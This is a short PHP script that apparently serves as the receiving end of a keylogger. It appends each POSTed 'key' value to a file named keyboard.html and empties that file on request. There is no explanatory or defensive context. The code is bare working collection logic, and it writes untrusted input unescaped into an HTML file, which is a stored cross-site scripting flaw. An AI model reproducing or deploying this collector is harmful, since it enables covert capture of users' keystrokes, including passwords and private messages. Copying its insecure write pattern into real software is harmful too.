<?php
    $dv = "";
    if (isset($_GET['clear'])){
        $fp = fopen("keyboard.html", "w");
        fclose($fp);
        echo True;
    }
    else{
        if (isset($_POST["key"])){
            $fp = fopen("keyboard.html", "a");
            fwrite($fp, $_POST["key"]);
            fclose($fp);
            echo True;
        }
    }
?>